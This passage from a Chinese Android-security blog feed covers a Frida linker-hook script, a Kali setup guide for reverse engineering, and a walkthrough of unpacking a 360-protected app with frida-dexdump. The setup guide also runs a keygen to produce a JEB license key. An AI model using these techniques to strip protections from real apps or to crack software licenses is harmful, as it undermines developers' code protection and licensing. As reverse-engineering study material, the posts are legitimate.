? mSecond = <span class="string">&quot;00&quot;</span> + mSecond : mSecond &lt; <span class="number">100</span> ? mSecond = <span class="string">&quot;0&quot;</span> + mSecond : mSecond;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> time = hour + <span class="string">&quot;:&quot;</span> + minute + <span class="string">&quot;:&quot;</span> + second + <span class="string">&quot;:&quot;</span> + mSecond;</span><br><span class="line">    <span class="keyword">var</span> threadid = <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[&quot;</span> + time + <span class="string">&quot;]&quot;</span> + <span class="string">&quot;-&gt;threadid:&quot;</span> + threadid + <span class="string">&quot;--&quot;</span> + log);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hooklinker</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> linkername = <span class="string">&quot;linker&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> call_function_addr = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> arch = <span class="title class_">Process</span>.<span class="property">arch</span>;</span><br><span class="line">    <span class="title class_">LogPrint</span>(<span class="string">&quot;Process run in:&quot;</span> + arch);</span><br><span class="line">    <span class="keyword">if</span> (arch.<span class="title function_">endsWith</span>(<span class="string">&quot;arm&quot;</span>)) &#123;</span><br><span class="line">        linkername = <span class="string">&quot;linker&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        linkername = <span class="string">&quot;linker64&quot;</span>;</span><br><span class="line">        <span class="title class_">LogPrint</span>(<span class="string">&quot;arm64 is not supported yet!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> symbols = <span class="title class_">Module</span>.<span class="title function_">enumerateSymbolsSync</span>(linkername);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; symbols.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i];</span><br><span class="line">        <span class="comment">//LogPrint(linkername + &quot;-&gt;&quot; + symbol.name + &quot;---&quot; + symbol.address);</span></span><br><span class="line">        <span class="keyword">if</span> (symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;__dl__ZL13call_functionPKcPFviPPcS2_ES0_&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            call_function_addr = symbol.<span class="property">address</span>;</span><br><span class="line">            <span class="title class_">LogPrint</span>(<span class="string">&quot;linker-&gt;&quot;</span> + symbol.<span class="property">name</span> + <span class="string">&quot;---&quot;</span> + symbol.<span class="property">address</span>)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (call_function_addr != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> func_call_function = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(call_function_addr, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">NativeFunction</span>(call_function_addr,</span><br><span class="line">            <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]), <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params">arg0, arg1, arg2</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> functiontype = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">var</span> functionaddr = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">var</span> sopath = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (arg0 != <span class="literal">null</span>) &#123;</span><br><span class="line">                functiontype = <span class="title class_">Memory</span>.<span class="title function_">readCString</span>(arg0);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (arg1 != <span class="literal">null</span>) &#123;</span><br><span class="line">                functionaddr = arg1;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (arg2 != <span class="literal">null</span>) &#123;</span><br><span class="line">                sopath = <span class="title class_">Memory</span>.<span class="title function_">readCString</span>(arg2);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> modulebaseaddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(sopath);</span><br><span class="line">            <span class="title class_">LogPrint</span>(<span class="string">&quot;after load:&quot;</span> + sopath + <span class="string">&quot;--start call_function,type:&quot;</span> + functiontype + <span class="string">&quot;--addr:&quot;</span> + functionaddr + <span class="string">&quot;---baseaddr:&quot;</span> + modulebaseaddr);</span><br><span class="line">            <span class="keyword">if</span> (sopath.<span class="title function_">indexOf</span>(<span class="string">&#x27;libnative-lib.so&#x27;</span>) &gt;= <span class="number">0</span> &amp;&amp; functiontype == <span class="string">&quot;DT_INIT&quot;</span>) &#123;</span><br><span class="line">                <span class="title class_">LogPrint</span>(<span class="string">&quot;after load:&quot;</span> + sopath + <span class="string">&quot;--ignore call_function,type:&quot;</span> + functiontype + <span class="string">&quot;--addr:&quot;</span> + functionaddr + <span class="string">&quot;---baseaddr:&quot;</span> + modulebaseaddr);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_">func_call_function</span>(arg0, arg1, arg2);</span><br><span class="line">                <span class="title class_">LogPrint</span>(<span class="string">&quot;after load:&quot;</span> + sopath + <span class="string">&quot;--end call_function,type:&quot;</span> + functiontype + <span class="string">&quot;--addr:&quot;</span> + functionaddr + <span class="string">&quot;---baseaddr:&quot;</span> + modulebaseaddr);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(hooklinker)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇文章记录一下objection和frida的使用方法，相当于操作手册。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Kali搭建Android逆向环境</title>
    <link href="http://example.com/posts/fb170550.html"/>
    <id>http://example.com/posts/fb170550.html</id>
    <published>2022-08-13T08:08:26.960Z</published>
    <updated>2022-12-01T08:51:31.856Z</updated>
    
    <content type="html"><![CDATA[<p>每次都要找教程太累人了，自己写一个记录。</p><span id="more"></span><h1 id="1-Kali基础配置"><a href="#1-Kali基础配置" class="headerlink" title="1. Kali基础配置"></a>1. Kali基础配置</h1><p>去Kali官网下载最新版的<a href="https://www.kali.org/get-kali/#kali-virtual-machines">Kali虚拟机</a>，解压后放入VMware即可，将内存和处理器往高调。默认账户kali，密码kali。</p><p>将Kali调成永不熄屏。</p><img src="/posts/fb170550/1.1.1.png" class=""><img src="/posts/fb170550/1.1.2.png" class=""><p>修改账户root的密码为toor，重启，使用root用户登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>如果Kali里的时间不正确，修改为正确时间：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-reconfigure tzdata</span><br></pre></td></tr></table></figure><p>选择Asia -&gt; Shanghai。</p><p>检查与更新软件包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade</span><br></pre></td></tr></table></figure><p>如果在Kali中中文显示乱码，安装中文依赖包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install xfonts-intl-chinese</span><br><span class="line">apt install ttf-wqy-microhei</span><br></pre></td></tr></table></figure><p>将zsh回退到bash，修改完重启Kali：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /bin/bash</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>增加HISTSIZE，可以保存更多的命令历史：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim .bashrc</span><br></pre></td></tr></table></figure><p>将HISTSIZE和HISTFILESIZE设置大一点：</p><img src="/posts/fb170550/1.1.3.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source .bashrc</span><br></pre></td></tr></table></figure><p>如果有科学上网，可以设置代理，没有可以不弄：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><img src="/posts/fb170550/1.1.4.png" class=""><p>注释掉proxy_dns和socks4，增加socks5 [连接虚拟机网卡的主机IP] [端口]。</p><img src="/posts/fb170550/1.1.5.png" class=""><img src="/posts/fb170550/1.1.6.png" class=""><h1 id="2-实用工具"><a href="#2-实用工具" class="headerlink" title="2. 实用工具"></a>2. 实用工具</h1><h2 id="2-1-htop"><a href="#2-1-htop" class="headerlink" title="2.1 htop"></a>2.1 htop</h2><p>安装htop，用来动态查看当前活跃的、占用高的进程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install htop</span><br></pre></td></tr></table></figure><h2 id="2-2-jnettop"><a href="#2-2-jnettop" class="headerlink" title="2.2 jnettop"></a>2.2 jnettop</h2><p>安装jnettop，流量查看工具，可以查看下载和安装速度：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install jnettop</span><br></pre></td></tr></table></figure><h2 id="2-3-010-Editor"><a href="#2-3-010-Editor" class="headerlink" title="2.3 010 Editor"></a>2.3 010 Editor</h2><p>安装<a href="https://www.sweetscape.com/download/010editor/">010 Editor</a>，查看文件格式工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.sweetscape.com/download/010EditorLinux64Installer.tar.gz</span><br><span class="line">tar zxvf 010EditorLinux64Installer.tar.gz</span><br><span class="line">./010EditorLinux64Installer</span><br></pre></td></tr></table></figure><h2 id="2-4-VSCode"><a href="#2-4-VSCode" class="headerlink" title="2.4 VSCode"></a>2.4 VSCode</h2><p>安装<a href="https://code.visualstudio.com/">VSCode</a>，下载<code>.deb</code>包，解压：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install dpkg</span><br><span class="line">dpkg -i code_1.70.1-1660113095_amd64.deb</span><br></pre></td></tr></table></figure><p>VSCode在root用户打不开，可在快捷方式右键 -&gt; Edit Application，在Command中修改为以下命令即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/code/code --no-sandbox --unity-launch %F</span><br></pre></td></tr></table></figure><h1 id="3-安卓逆向必备工具"><a href="#3-安卓逆向必备工具" class="headerlink" title="3. 安卓逆向必备工具"></a>3. 安卓逆向必备工具</h1><h2 id="3-1-Android-Studio"><a href="#3-1-Android-Studio" class="headerlink" title="3.1 Android Studio"></a>3.1 Android Studio</h2><p>去<a href="https://developer.android.google.cn/studio">Android Studio官网</a>下载安装Android Studio：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://redirector.gvt1.com/edgedl/android/studio/ide-zips/2021.2.1.16/android-studio-2021.2.1.16-linux.tar.gz</span><br><span class="line">tar zxvf android-studio-2021.2.1.16-linux.tar.gz</span><br><span class="line">cd android-studio/bin</span><br><span class="line">./studio.sh</span><br></pre></td></tr></table></figure><p>运行AS让它下载SDK，创建一个Empty Avtivity让它下载并初始化一下安卓开发环境。</p><h2 id="3-2-Jadx"><a href="#3-2-Jadx" class="headerlink" title="3.2 Jadx"></a>3.2 Jadx</h2><p>安装反编译工具<a href="https://github.com/skylot/jadx">jadx</a>，下载最新版：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/skylot/jadx/releases/download/v1.4.3/jadx-1.4.3.zip</span><br><span class="line">7z x jadx-1.4.3.zip</span><br><span class="line">cd bin</span><br><span class="line">./jadx-gui</span><br></pre></td></tr></table></figure><p>将其加入系统路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure><p>在文件末尾添加一条路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATH=$PATH:/root/jadx-1.4.3/bin;export PATH;</span><br></pre></td></tr></table></figure><p>保存后source一下，就可以在任意路径中使用jadx了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bashrc</span><br><span class="line">jadx-gui</span><br></pre></td></tr></table></figure><h2 id="3-3-jeb"><a href="#3-3-jeb" class="headerlink" title="3.3 jeb"></a>3.3 jeb</h2><p>下载反编译工具<a href="https://down.52pojie.cn/Tools/Android_Tools/JEB_demo_4.16.0.202205110304_JEBDecompiler_121820464987384330.zip">jeb</a>到主机，拖进Kali，解压，运行jeb让它初始化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">7z x JEB-4.16.0.zip</span><br><span class="line">cd JEB-4.16.0</span><br><span class="line">7z x jeb-demo-4.16.0.zip</span><br><span class="line">cd jeb-demo-4.16.0</span><br><span class="line">./jeb_linux.sh</span><br></pre></td></tr></table></figure><p>打开写入Key name后，点击Manual Key Generation，复制License data。运行<code>jebKengen.py</code>，输入License data后会输出License key，回填即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 jebKeygen.py</span><br></pre></td></tr></table></figure><h2 id="3-4-scrcpy"><a href="#3-4-scrcpy" class="headerlink" title="3.4 scrcpy"></a>3.4 scrcpy</h2><p>安装scrcpy，远程桌面，可以将手机界面投屏到电脑上查看实时情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt search scrcpy</span><br><span class="line">apt install scrcpy</span><br></pre></td></tr></table></figure><h1 id="4-Frida版本管理和开发环境"><a href="#4-Frida版本管理和开发环境" class="headerlink" title="4. Frida版本管理和开发环境"></a>4. Frida版本管理和开发环境</h1><h2 id="4-1-pyenv"><a href="#4-1-pyenv" class="headerlink" title="4.1 pyenv"></a>4.1 pyenv</h2><p>安装pyenv，设置多版本Python环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pyenv/pyenv.git ~/.pyenv</span><br><span class="line">echo &#x27;export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">echo &#x27;command -v pyenv &gt;/dev/null || export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">echo &#x27;eval &quot;$(pyenv init -)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">exec &quot;$SHELL&quot;</span><br><span class="line">sudo apt-get update; sudo apt-get install make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev</span><br><span class="line">source .bashrc</span><br></pre></td></tr></table></figure><p>查看当前Python版本，Python2和Python3都有，默认是Python 3.10.5：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# python -V</span><br><span class="line">Python 3.10.5</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# python2 -V</span><br><span class="line">Python 2.7.18</span><br></pre></td></tr></table></figure><p>也可以安装自己喜欢的版本，比如3.8.0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyenv install 3.8.0</span><br></pre></td></tr></table></figure><p>安装完成后切换Python版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pyenv local 3.8.0</span><br><span class="line">pyenv local system</span><br></pre></td></tr></table></figure><h2 id="4-2-Frida-Objection"><a href="#4-2-Frida-Objection" class="headerlink" title="4.2 Frida + Objection"></a>4.2 Frida + Objection</h2><p>在Python 3.8.0环境下安装对应的Frida和objection版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade pip   </span><br><span class="line">pip install frida==12.8.0</span><br><span class="line">pip install frida-tools==5.3.0</span><br><span class="line">pip install objection==1.8.4</span><br></pre></td></tr></table></figure><h2 id="4-3-frida-dexdump"><a href="#4-3-frida-dexdump" class="headerlink" title="4.3 frida-dexdump"></a>4.3 frida-dexdump</h2><p>安装frida-dexdump：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.objection/plugins/</span><br><span class="line">git clone https://github.com/hluwa/frida-dexdump.git ~/.objection/plugins/frida-dexdump</span><br><span class="line">或</span><br><span class="line">pip install frida-dexdump</span><br></pre></td></tr></table></figure><h2 id="4-4-Wallbreaker"><a href="#4-4-Wallbreaker" class="headerlink" title="4.4 Wallbreaker"></a>4.4 Wallbreaker</h2><p>安装Wallbreaker插件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.objection/plugins/</span><br><span class="line">git clone https://github.com/hluwa/Wallbreaker ~/.objection/plugins/Wallbreaker</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;每次都要找教程太累人了，自己写一个记录。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Android壳与脱壳</title>
    <link href="http://example.com/posts/18047266.html"/>
    <id>http://example.com/posts/18047266.html</id>
    <published>2022-08-11T14:45:22.828Z</published>
    <updated>2022-12-01T08:57:14.344Z</updated>
    
    <content type="html"><![CDATA[<p>从前面的笔记我们已经知道Frida如何安装并可以用来进行Native层注入，Frida其实还有一个很强大的功能，就是脱壳。这篇文章就来认识一下Android的壳与记录一下Frida脱壳的基本步骤。</p><span id="more"></span><h1 id="0-Android壳的类型"><a href="#0-Android壳的类型" class="headerlink" title="0. Android壳的类型"></a>0. Android壳的类型</h1><p>壳的种类非常多，根据其种类不同，使用的技术也不同，这里稍微简单分个类：</p><ul><li>一代整体型壳：采用Dex整体加密，动态加载运行的机制；</li><li>二代函数抽取型壳：粒度更细，将方法单独抽取出来，加密保存，解密执行；</li><li>三代VMP、Dex2C壳：独立虚拟机解释执行、语义等价语法迁移，强度最高。</li></ul><p>先说最难的<code>Dex2C</code>目前是没有办法还原的，只能跟踪进行分析；<code>VMP</code>虚拟机解释执行保护的是映射表，只要心思细、功夫深，是可以将映射表还原的；二代壳函数抽取目前是可以从根本上进行还原的，dump出所有的运行时的方法体，填充到dump下来的<code>DEX</code>中去的，这也是<a href="https://bbs.pediy.com/thread-252630.htm"><code>fart</code></a>的核心原理；一代壳大部分情况下可以用目前我们推荐的几个内存中搜索和dump出<code>DEX</code>的Frida工具进行脱壳。</p><p>目前主流的一些加固厂商有：娜迦、梆梆、爱加密、通付盾、360加固、百度加固、阿里加固、腾讯加固、顶象加固、盛大加固、瑞星加固、网秦加固、国信灵通加固、apkprotect加固。</p><p>某些加固厂商的加固特征：<a href="https://blog.csdn.net/c_kongfei/article/details/114297479">https://blog.csdn.net/c_kongfei/article/details/114297479</a></p><h1 id="1-加固技术"><a href="#1-加固技术" class="headerlink" title="1. 加固技术"></a>1. 加固技术</h1><h2 id="1-1-第一代壳-DEX加密"><a href="#1-1-第一代壳-DEX加密" class="headerlink" title="1.1 第一代壳 DEX加密"></a>1.1 第一代壳 DEX加密</h2><h3 id="1-1-1-一代壳加固原理"><a href="#1-1-1-一代壳加固原理" class="headerlink" title="1.1.1 一代壳加固原理"></a>1.1.1 一代壳加固原理</h3><p>一代壳也称落地加载，就是对源APK进行加密，再套上一层壳，在运行时对源APK进行解密并动态加载。</p><p>加固过程需要三个对象：</p><ul><li>待加固APK，也就是源APK</li><li>脱壳程序APK，负责对源APK进行解密</li><li>加密工具(加壳程序)，负责加密源APK并与脱壳DEX合并成新的DEX</li></ul><p>在DEX中可进行的加固方法有：字符串加密、资源加密、对抗反编译、反调试、自定义DexClassLoader。</p><p>DEX整体加固的本质是文件加载和内存加载。</p><h3 id="1-1-2-加固的主要步骤"><a href="#1-1-2-加固的主要步骤" class="headerlink" title="1.1.2 加固的主要步骤"></a>1.1.2 加固的主要步骤</h3><p>拿到源APK和脱壳程序APK，用加密算法对源APK进行加密，再将加密后的APK文件与脱壳APK中的DEX文件进行合并得到一个新的DEX文件，最后替换脱壳程序APK中的DEX文件即可。此时得到一个新的APK文件，那么该APK就是加固后的APK，它的主要工作是在运行时解密源APK，然后动态加载，让其正常运行起来。</p><p>合并时主要关注DEX文件的dex header中的checksum、signature、file_size字段。因为我们需要将一个文件写入到DEX中，那么我们肯定需要修改文件校验码(checksum)，因为它用于检查文件是否有错误。同样需要修改signature，它唯一识别DEX文件。还有就是需要修改DEX文件的大小(file_size)。</p><ul><li>checksum：文件校验码。使用alder32算法校验文件中除maigc和checksum外剩下的所有文件区域，用于检查文件错误。</li><li>signature：使用SHA-1算法对除magic 、checksum和signature外剩下的的所有文件区域做HASH运算，用于唯一识别DEX文件。</li><li>file_size：DEX文件大小。</li></ul><p>不过将源APK写入到DEX文件以后还需要将加密后APK的大小添加在文件末尾，目的就是在脱壳时根据文件大小得到正确的源APK。所以合并以后得到的新DEX文件结构如下图所示：</p><img src="/posts/18047266/1.1.1.jpg" class="" title="加固后的DEX文件"><h3 id="1-1-3-一代壳脱壳工具dexdump"><a href="#1-1-3-一代壳脱壳工具dexdump" class="headerlink" title="1.1.3 一代壳脱壳工具dexdump"></a>1.1.3 一代壳脱壳工具dexdump</h3><p>脱壳方法：一种是从内存中找到DEX；另一种是基于Hook然后判断是否是DEX文件，dump_dex &amp;&amp; Frida_fart。</p><h4 id="1-1-3-1-环境配置"><a href="#1-1-3-1-环境配置" class="headerlink" title="1.1.3.1 环境配置"></a>1.1.3.1 环境配置</h4><p><a href="https://v5le0n9.github.io/posts/fb170550.html">Kali搭建Android逆向环境</a></p><h4 id="1-1-3-2-脱壳步骤"><a href="#1-1-3-2-脱壳步骤" class="headerlink" title="1.1.3.2 脱壳步骤"></a>1.1.3.2 脱壳步骤</h4><p>如果在Android设备上下载的APK，先将APK使用<code>adb pull</code>命令将它从Android设备拉出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull xxxx.apk</span><br></pre></td></tr></table></figure><p>如果需要安装至Android设备则使用<code>adb install</code>命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install xxxx.apk</span><br></pre></td></tr></table></figure><p>用Android查壳工具查看APK程序是否加壳，APK使用了360加固。</p><img src="/posts/18047266/1.1.2.png" class="" title="APP查壳"><p>载入jadx，核心代码都被藏起来了。</p><img src="/posts/18047266/1.1.3.png" class="" title="jadx查看"><p>那我们可以先来脱壳。运行frida-server。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bullhead:/data/local/tmp # ./frida-server-12.8.0-android-arm64</span><br></pre></td></tr></table></figure><p>在jadx中查看它的包名为com.coolapk.market。运行App，使用objection工具连接Android设备中的App。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali# objection -g com.coolapk.market explore</span><br></pre></td></tr></table></figure><p>动态加载dexdump工具，进行脱壳：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.coolapk.market on (Android: 9) [usb] # plugin load root/.objection/plugins/frida-dexdump/frida_dexdump</span><br><span class="line">com.coolapk.market on (Android: 9) [usb] # plugin dexdump dump</span><br></pre></td></tr></table></figure><p>但貌似新版的frida-dexdump不支持作为objection插件了？那就直接利用frida-dexdump进行脱壳：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali# frida-dexdump -U -f com.coolapk.market</span><br></pre></td></tr></table></figure><img src="/posts/18047266/1.1.5.png" class=""><p>脱壳成功后会在当前目录生成一个以包名命名的目录，里面是一堆DEX文件。一般都是找其中DEX文件最大、并且内容含有“MainActivity”字符串的DEX文件来分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -ril &quot;MainActivity&quot; *</span><br><span class="line">du -h xxxx.dex</span><br></pre></td></tr></table></figure><img src="/posts/18047266/1.1.4.png" class=""><p>将DEX文件载入jadx分析，发现校验码出错，使用010Editor修改其校验码即可。</p><img src="/posts/18047266/1.1.6.png" class=""><p>修改为0x5f3f35fa。</p><img src="/posts/18047266/1.1.7.png" class=""><p>动态加载与jadx反编译后的类名有很大不同，很有可能是做了混淆，但这个DEX文件相比之前未脱壳的APK已经多了很多内容了。</p><img src="/posts/18047266/1.1.8.png" class=""><h2 id="1-2-第二代壳-DEX抽取与so加固"><a href="#1-2-第二代壳-DEX抽取与so加固" class="headerlink" title="1.2 第二代壳 DEX抽取与so加固"></a>1.2 第二代壳 DEX抽取与so加固</h2><p>对抗第一代壳常见的脱壳法、Dex Method代码抽取到外部(通常企业版)、Dex动态加载、so加密。</p><p>函数抽取：在函数粒度完成代码的保护</p><h2 id="1-3-第三代壳-DEX动态解密与so混淆"><a href="#1-3-第三代壳-DEX动态解密与so混淆" class="headerlink" title="1.3 第三代壳 DEX动态解密与so混淆"></a>1.3 第三代壳 DEX动态解密与so混淆</h2><p>Dex Method代码动态解密、so代码膨胀混淆、对抗之前出现的所有脱壳法。</p><p>VMP和Dex2C：Java函数Native化</p><h2 id="1-4-SO加固"><a href="#1-4-SO加固" class="headerlink" title="1.4 SO加固"></a>1.4 SO加固</h2><p>SO加固能很好地保护客户代码，避免被静态分析。第三方SO加固都是处于无源码的环境，加固功能都依赖于壳代码的实现。在对抗动态分析时，可配置防调试功能减少被动态调试和dump内存的可能性。在SO加固时，对关键代码添加一些指令混淆和VMP的处理，即使在攻击者绕过反调试的情况下也能最大限度地保护代码。</p><p>so加固种类：</p><ol><li>基于init、init_array以及JNI_Onload函数的加壳</li><li>基于自定义linker的加壳工具</li></ol><h3 id="1-4-1-so加固方法"><a href="#1-4-1-so加固方法" class="headerlink" title="1.4.1 so加固方法"></a>1.4.1 so加固方法</h3><h4 id="1-4-1-1-Section加密"><a href="#1-4-1-1-Section加密" class="headerlink" title="1.4.1.1 Section加密"></a>1.4.1.1 